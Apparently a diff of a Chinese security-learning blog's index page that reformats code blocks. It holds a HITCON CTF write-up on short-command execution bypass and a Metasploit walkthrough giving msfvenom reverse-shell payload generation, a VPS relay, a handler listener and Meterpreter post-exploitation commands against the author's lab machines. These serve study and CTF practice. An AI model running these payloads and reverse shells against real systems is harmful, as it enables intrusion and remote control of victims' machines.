             <a href="/2018/07/17/浅谈Arp攻击和利用Arp欺骗进行MITM/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -688,9 +604,16 @@
                 <p>#HITCON CTF命令执行绕过</p>
 <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近开始暑假生活，基本上是吃喝玩乐。但是过两天还有一场peakgeek，不想让自己松懈，学习一道命令执行的题目，由于没有自己的服务器来搭小马，我就大致在自己的linux进行绕过操作，才发现自己linux命令学的狗屁不是，构造能力也特别垃圾</p>
 <h2 id="BabayFirst"><a href="#BabayFirst" class="headerlink" title="BabayFirst"></a>BabayFirst</h2><p>题目给的源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 5) &#123;</span><br><span class="line">        @exec($_GET[&apos;cmd&apos;]);</span><br><span class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</span><br><span class="line">        @exec(&apos;/bin/rm -rf &apos; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
-
-<h2 id="linux写文件命令"><a href="#linux写文件命令" class="headerlink" title="linux写文件命令"></a>linux写文件命令</h2><p>题目大致意思是给每个人创建一个不同的目录，然后你在当前目录下进行命令执行。</p>
+<pre><code>&lt;?php
+    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {
+        @exec($_GET[&#39;cmd&#39;]);
+    } else if (isset($_GET[&#39;reset&#39;])) {
+        @exec(&#39;/bin/rm -rf &#39; . $sandbox);
+    }
+    highlight_file(__FILE__);</code></pre><h2 id="linux写文件命令"><a href="#linux写文件命令" class="headerlink" title="linux写文件命令"></a>linux写文件命令</h2><p>题目大致意思是给每个人创建一个不同的目录，然后你在当前目录下进行命令执行。</p>
 <p>命令的长度不能超过5<br>这里有一篇文章:<br><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="noopener"> 从七个字符长度的任意命令执行到GetShell</a></p>
 <p>文章讲了一种方法，通过<code>&gt;</code>命令建立空文件，再用<code>ls -t&gt;</code>把当前目录的<strong>文件名</strong>当作<strong>文件内容</strong>导入到一个<strong>新的文件</strong>中。<strong>新的文件</strong>中也包含当前文件名，内容按照ascii码表排序换行。</p>
 <p>linux还有一个小技巧，<code>\</code>可以对命令进行换行，是命令的拼接操作，具体如下<br><img src="https://s1.ax1x.com/2018/07/14/PMwdcq.png" alt></p>
@@ -699,13 +622,25 @@
 <p>值得注意的是，若文件名有反斜杠，则要用<code>\\</code>来写，还有空格、&gt;要用<code>\</code>、<code>\&gt;</code>来写，用转义符。</p>
 <p>根据图片的ls可以看到，我们的文件名是按ascii码表排的，生成文件的话命令是杂乱的，也是无效的。所以我们用<code>ls -t&gt;</code>按照时间顺序来写入文件。</p>
 <p>但是这题有长度限制, ls -t&gt;已经超过5个字符。<br>网上思路是把ls -t&gt;也写成一个文件，用sh执行，那么就需要构造这个文件了。<br>构造思路纠结了我很久，后来看到一种巧妙的方法，借助<code>&gt;&gt;</code>来文件追加<br>写文件过程:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;l\\</span><br><span class="line">&gt;s \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;g</span><br></pre></td></tr></table></figure>
-
-<p>接着执行ls&gt;a，得到a中文件内容应该是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;-t\&apos;</span><br><span class="line">&apos;&gt;g&apos;</span><br><span class="line">&apos;a&apos;</span><br><span class="line">&apos;l\&apos;</span><br><span class="line">&apos;s \&apos;</span><br></pre></td></tr></table></figure>
-
-<p>如果我们追加<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">&apos;-t\&apos;</span><br><span class="line">&apos;&gt;g&apos;</span><br><span class="line">&apos;a&apos;</span><br><span class="line">&apos;l\&apos;</span><br><span class="line">&apos;s \&apos;</span><br><span class="line">&apos;-t\&apos;</span><br><span class="line">&apos;&gt;g&apos;</span><br><span class="line">&apos;a&apos;</span><br><span class="line">&apos;l\&apos;</span><br><span class="line">&apos;s \&apos;</span><br></pre></td></tr></table></figure></p>
-<p>前三行和后三行命令无效，只有中间部分的命令有效。所以a文件的可执行内容就只是:ls -t&gt;g</p>
+<pre><code>&gt;l\\
+&gt;s \\
+&gt;-t\\
+&gt;\&gt;g</code></pre><p>接着执行ls&gt;a，得到a中文件内容应该是这样的：</p>
+<pre><code>&#39;-t\&#39;
+&#39;&gt;g&#39;
+&#39;a&#39;
+&#39;l\&#39;
+&#39;s \&#39;</code></pre><p>如果我们追加<code>ls&gt;&gt;a</code>则内容应该是这样的：</p>
+<pre><code>&#39;-t\&#39;
+&#39;&gt;g&#39;
+&#39;a&#39;
+&#39;l\&#39;
+&#39;s \&#39;
+&#39;-t\&#39;
+&#39;&gt;g&#39;
+&#39;a&#39;
+&#39;l\&#39;
+&#39;s \&#39;</code></pre><p>前三行和后三行命令无效，只有中间部分的命令有效。所以a文件的可执行内容就只是:ls -t&gt;g</p>
 <p>接着还要构造curl请求来下载一个小马。这点还没有学会，以后再记</p>
 <h2 id="用echo和-gt-gt-追加命令写shell"><a href="#用echo和-gt-gt-追加命令写shell" class="headerlink" title="用echo和&gt;&gt;追加命令写shell"></a>用echo和&gt;&gt;追加命令写shell</h2><p>这个是偶然看到郁离歌的博客里写的，对长度限制不是那么严格的时候可以用。<br><img src="https://s1.ax1x.com/2018/07/14/PMwc4J.png" alt></p>
 <p>但是看到别人博客写，有时候这样php文件不能执行，原因就在于换行。最好可以把POST[]写到一行。所以这个方法不是很好，大多数是用wget或者curl下载小马，但是我还没学会</p>
@@ -715,7 +650,7 @@
             </div>
             <div class="continue">
             <a href="/2018/07/14/HITCON CTF命令执行绕过/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -759,64 +694,90 @@
 </ul>
 <p>木马连接方向：<br>msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试）</p>
 <p>操作系统位数查看：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getconf LONG_BIT</span><br></pre></td></tr></table></figure>
-
-<h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><p>linux相关payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 linux/x86/meterpreter/reverse_tcp</span><br><span class="line">2 linux/x86/meterpreter/bind_tcp</span><br><span class="line">3 linux/x86/shell_bind_tcp</span><br><span class="line">4 linux/x86/shell_reverse_tcp</span><br><span class="line">5 linux/x64/shell_reverse_tcp</span><br><span class="line">6 linux/x64/shell_bind_tcp</span><br></pre></td></tr></table></figure>
-
-<p>windows相关payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 windows/meterpreter/reverse_tcp</span><br><span class="line">2 windows/meterpreter/bind_tcp</span><br><span class="line">3 windows/shell_reverse_tcp</span><br><span class="line">4 windows/shell_bind_tcp</span><br><span class="line">5 windows/x64/meterpreter/reverse_tcp</span><br><span class="line">6 windows/x64/meterpreter/bind_tcp</span><br><span class="line">7 windows/x64/shell_reverse_tcp</span><br><span class="line">8 windows/x64/shell_bind_tcp</span><br></pre></td></tr></table></figure>
-
-<p>payload具体参数含义:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>
-
-<p>一个典型的msfvenom使用举例如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&apos;s IP] lport=7777 -f exe -o /tmp/my_payload.exe</span><br></pre></td></tr></table></figure>
-
-<h2 id="自己的看法"><a href="#自己的看法" class="headerlink" title="自己的看法"></a>自己的看法</h2><p>最近真的好忙…然后又在这里胡乱研究Metasploit，感觉后天实验班考核要凉凉…<br>背景：我有一台Kali的虚拟机，一台外网vps，想要渗透一台win7的虚拟机。目前还没有学到提权，只是会用msf生成反弹马，然后msf监听外网vps接收的数据。win7我虚拟机开了Nat进行转发，传上去了小马，菜刀连接上。</p>
+<pre><code>getconf LONG_BIT</code></pre><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><p>linux相关payload：</p>
+<pre><code>1 linux/x86/meterpreter/reverse_tcp
+2 linux/x86/meterpreter/bind_tcp
+3 linux/x86/shell_bind_tcp
+4 linux/x86/shell_reverse_tcp
+5 linux/x64/shell_reverse_tcp
+6 linux/x64/shell_bind_tcp</code></pre><p>windows相关payload:</p>
+<pre><code>1 windows/meterpreter/reverse_tcp
+2 windows/meterpreter/bind_tcp
+3 windows/shell_reverse_tcp
+4 windows/shell_bind_tcp
+5 windows/x64/meterpreter/reverse_tcp
+6 windows/x64/meterpreter/bind_tcp
+7 windows/x64/shell_reverse_tcp
+8 windows/x64/shell_bind_tcp</code></pre><p>payload具体参数含义:</p>
+<pre><code>-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)
+-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all
+-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度
+-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
+-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
+-a, --arch       &lt;architecture&gt;  指定payload的目标架构
+    --platform   &lt;platform&gt;      指定payload的目标平台
+-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度
+-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;
+-i, --iterations &lt;count&gt;         指定payload的编码次数
+-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件
+-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板
+-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+    --payload-options            列举payload的标准选项
+-o, --out   &lt;path&gt;               保存payload
+-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式
+    --shellest                   最小化生成payload
+-h, --help                       查看帮助选项
+    --help-formats               查看msf支持的输出格式列表</code></pre><p>一个典型的msfvenom使用举例如下：</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#39;s IP] lport=7777 -f exe -o /tmp/my_payload.exe</code></pre><h2 id="自己的看法"><a href="#自己的看法" class="headerlink" title="自己的看法"></a>自己的看法</h2><p>最近真的好忙…然后又在这里胡乱研究Metasploit，感觉后天实验班考核要凉凉…<br>背景：我有一台Kali的虚拟机，一台外网vps，想要渗透一台win7的虚拟机。目前还没有学到提权，只是会用msf生成反弹马，然后msf监听外网vps接收的数据。win7我虚拟机开了Nat进行转发，传上去了小马，菜刀连接上。</p>
 <p>因为我是内网的Kali，所以要进行内网穿透：<br>内网穿透，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透，就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p>
 <p>首先我们为什么要内网穿透？因为我们的kali在内网，当木鸡（简称）执行我们msf生成的EXE木马时，它会把自己的Shell反弹出去，当然这个Shell不可能反弹到我们自己的内网。那么我们就需要有个外网的ip来监听这个Shell。当然，我们也可以用自己的外网ip来映射到kali上。但是一方面我觉得不安全，另一方面我觉得windows限制太多了，所以就利用我有的一台Centos7的VPS来当作这个跳板。时间不多了，开始记录一下目前的步骤：</p>
 <h2 id="获取meterpreter会话"><a href="#获取meterpreter会话" class="headerlink" title="获取meterpreter会话"></a>获取meterpreter会话</h2><h3 id="VPS开启流量转发"><a href="#VPS开启流量转发" class="headerlink" title="VPS开启流量转发"></a>VPS开启流量转发</h3><p>在网上看到有人说用lcx作为内网端口转发的工具，但是centos7好像编译环境不允许lcx，使用不起。用Ssocks搭建隧道，监听两个端口，7777用来接收来自受害者反弹的shell，7778将7777的流量转发出。下载sSocks，执行命令编译<code>./configure &amp;&amp; make</code>,进入src文件夹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rcsocks -l 7777 -p 7778</span><br></pre></td></tr></table></figure>
-
-<h2 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h2><h3 id="Kali生成Payload-in-Linux"><a href="#Kali生成Payload-in-Linux" class="headerlink" title="Kali生成Payload in Linux"></a>Kali生成Payload in Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
-
-<h3 id="Kali生成Payload-in-Windows"><a href="#Kali生成Payload-in-Windows" class="headerlink" title="Kali生成Payload in Windows"></a>Kali生成Payload in Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
-
-<h3 id="Kali分步生成Payload"><a href="#Kali分步生成Payload" class="headerlink" title="Kali分步生成Payload"></a>Kali分步生成Payload</h3><p>分步执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use payload/windows/meterpreter/reverse_tcp  #指定payload</span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; set lhost xxxxx(外网Ip) #设置监听地址</span><br><span class="line">lhost =&gt; xxxxx(外网Ip) </span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; set lport 7777(监听流量流入端口)</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; generate -b &apos;\x00\xff&apos; -t exe -e x86/shikata_ga_nai -i 5 -f /root/test.exe</span><br><span class="line">[*] Writing 73802 bytes to /root/test.exe...</span><br></pre></td></tr></table></figure>
-
-<h2 id="msf进行监听"><a href="#msf进行监听" class="headerlink" title="msf进行监听"></a>msf进行监听</h2><p>回到msf主界面：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; payload(reverse_tcp) &gt; back</span><br></pre></td></tr></table></figure>
-
-<p>运行监听模块：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-
-<p>设置接收的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>
-
-<p>设置vps监听的地址和转发的端口：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; set rhost xxxx(外网Ip)</span><br><span class="line">rhost =&gt; xxxx(外网Ip)</span><br><span class="line">msf exploit(handler) &gt; set lport 7778</span><br><span class="line">lport =&gt; 7778</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Sending stage (957999 bytes) to xxxx(外网Ip)</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
-
-<h2 id="靶机运行Payload"><a href="#靶机运行Payload" class="headerlink" title="靶机运行Payload"></a>靶机运行Payload</h2><p>Linux下运行elf会提示没有权限，加权限：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomd +x ./shell.elf</span><br></pre></td></tr></table></figure>
-
-<p>然后再运行就可以了</p>
-<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background  # 让meterpreter处于后台模式  </span><br><span class="line">sessions -i index   # 与会话进行交互，index表示第一个session  </span><br><span class="line">quit  # 退出会话  </span><br><span class="line">shell # 获得控制台权限  </span><br><span class="line">irb # 开启ruby终端</span><br></pre></td></tr></table></figure>
-
-<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat # 查看文件内容  </span><br><span class="line">getwd # 查看当前工作目录  </span><br><span class="line">upload  # 上传文件到目标机上  </span><br><span class="line">download # 下载文件到本机上  </span><br><span class="line">edit # 编辑文件  </span><br><span class="line">search  # 搜索文件</span><br></pre></td></tr></table></figure>
-
-<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig / ifconfig # 查看网络接口信息  </span><br><span class="line">portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 </span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line">route # 获取路由表信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps # 查看当前活跃进程 </span><br><span class="line">migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 </span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 </span><br><span class="line">getpid # 获取当前进程的pid </span><br><span class="line">kill pid # 杀死进程 </span><br><span class="line">getuid # 查看权限 </span><br><span class="line">sysinfo # 查看目标机系统信息，如机器名，操作系统等 </span><br><span class="line">shutdown # 关机</span><br></pre></td></tr></table></figure>
-
-<p>相关链接：<br><a href="http://www.itlnmp.com/373.html" target="_blank" rel="noopener">防火墙（firewalld）端口转发</a><br><a href="http://www.lxhsec.com/2017/11/02/msf/" target="_blank" rel="noopener">利用metasploit进行提权</a><br><a href="http://wyb0.com/posts/msf-simple-elevate-privileges/" target="_blank" rel="noopener">Metasploit简单提权</a><br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">sSocks下载</a><br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="noopener">Socks代理反弹突破内网</a></p>
+<pre><code>./rcsocks -l 7777 -p 7778</code></pre><h2 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h2><h3 id="Kali生成Payload-in-Linux"><a href="#Kali生成Payload-in-Linux" class="headerlink" title="Kali生成Payload in Linux"></a>Kali生成Payload in Linux</h3><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h3 id="Kali生成Payload-in-Windows"><a href="#Kali生成Payload-in-Windows" class="headerlink" title="Kali生成Payload in Windows"></a>Kali生成Payload in Windows</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h3 id="Kali分步生成Payload"><a href="#Kali分步生成Payload" class="headerlink" title="Kali分步生成Payload"></a>Kali分步生成Payload</h3><p>分步执行：</p>
+<pre><code>msf &gt; use payload/windows/meterpreter/reverse_tcp  #指定payload
+msf &gt; payload(reverse_tcp) &gt; set lhost xxxxx(外网Ip) #设置监听地址
+lhost =&gt; xxxxx(外网Ip) 
+msf &gt; payload(reverse_tcp) &gt; set lport 7777(监听流量流入端口)
+lport =&gt; 6666
+msf &gt; payload(reverse_tcp) &gt; generate -b &#39;\x00\xff&#39; -t exe -e x86/shikata_ga_nai -i 5 -f /root/test.exe
+[*] Writing 73802 bytes to /root/test.exe...</code></pre><h2 id="msf进行监听"><a href="#msf进行监听" class="headerlink" title="msf进行监听"></a>msf进行监听</h2><p>回到msf主界面：</p>
+<pre><code>msf &gt; payload(reverse_tcp) &gt; back</code></pre><p>运行监听模块：</p>
+<pre><code>msf &gt; use exploit/multi/handler</code></pre><p>设置接收的payload：</p>
+<pre><code>msf exploit(handler) &gt; set payload windows/meterpreter/bind_tcp</code></pre><p>设置vps监听的地址和转发的端口：</p>
+<pre><code>msf exploit(handler) &gt; set rhost xxxx(外网Ip)
+rhost =&gt; xxxx(外网Ip)
+msf exploit(handler) &gt; set lport 7778
+lport =&gt; 7778
+msf exploit(handler) &gt; exploit
+[*] Started bind handler
+[*] Sending stage (957999 bytes) to xxxx(外网Ip)
+[*] Starting the payload handler...</code></pre><h2 id="靶机运行Payload"><a href="#靶机运行Payload" class="headerlink" title="靶机运行Payload"></a>靶机运行Payload</h2><p>Linux下运行elf会提示没有权限，加权限：</p>
+<pre><code>chomd +x ./shell.elf</code></pre><p>然后再运行就可以了</p>
+<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre><code>background  # 让meterpreter处于后台模式  
+sessions -i index   # 与会话进行交互，index表示第一个session  
+quit  # 退出会话  
+shell # 获得控制台权限  
+irb # 开启ruby终端</code></pre><h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><pre><code>cat # 查看文件内容  
+getwd # 查看当前工作目录  
+upload  # 上传文件到目标机上  
+download # 下载文件到本机上  
+edit # 编辑文件  
+search  # 搜索文件</code></pre><h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><pre><code>ipconfig / ifconfig # 查看网络接口信息  
+portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 
+rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码
+route # 获取路由表信息</code></pre><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><pre><code>ps # 查看当前活跃进程 
+migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 
+execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 
+getpid # 获取当前进程的pid 
+kill pid # 杀死进程 
+getuid # 查看权限 
+sysinfo # 查看目标机系统信息，如机器名，操作系统等 
+shutdown # 关机</code></pre><p>相关链接：<br><a href="http://www.itlnmp.com/373.html" target="_blank" rel="noopener">防火墙（firewalld）端口转发</a><br><a href="http://www.lxhsec.com/2017/11/02/msf/" target="_blank" rel="noopener">利用metasploit进行提权</a><br><a href="http://wyb0.com/posts/msf-simple-elevate-privileges/" target="_blank" rel="noopener">Metasploit简单提权</a><br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">sSocks下载</a><br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="noopener">Socks代理反弹突破内网</a></p>
 
                 
             </div>
             <div class="continue">
             <a href="/2018/07/09/内网穿透进行Metasploit渗透/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -849,16 +810,10 @@
                 
                 <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为最近要实验班考核，开始做一下Misc题目，毕竟要简单一些。。发现好多神奇在kali里面，就用ssh连接了本地win10和kali，搭了xftp互传文件，后台挂上kali解放双手解放内存，爽的不行~</p>
 <h3 id="又是一张图片，还单纯么"><a href="#又是一张图片，还单纯么" class="headerlink" title="又是一张图片，还单纯么"></a>又是一张图片，还单纯么</h3><p>丢到kali的binwalk里扫一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e 2.jpg</span><br></pre></td></tr></table></figure>
-
-<p>发现有好多文件，用Kali下的foremost分离一下：</p>
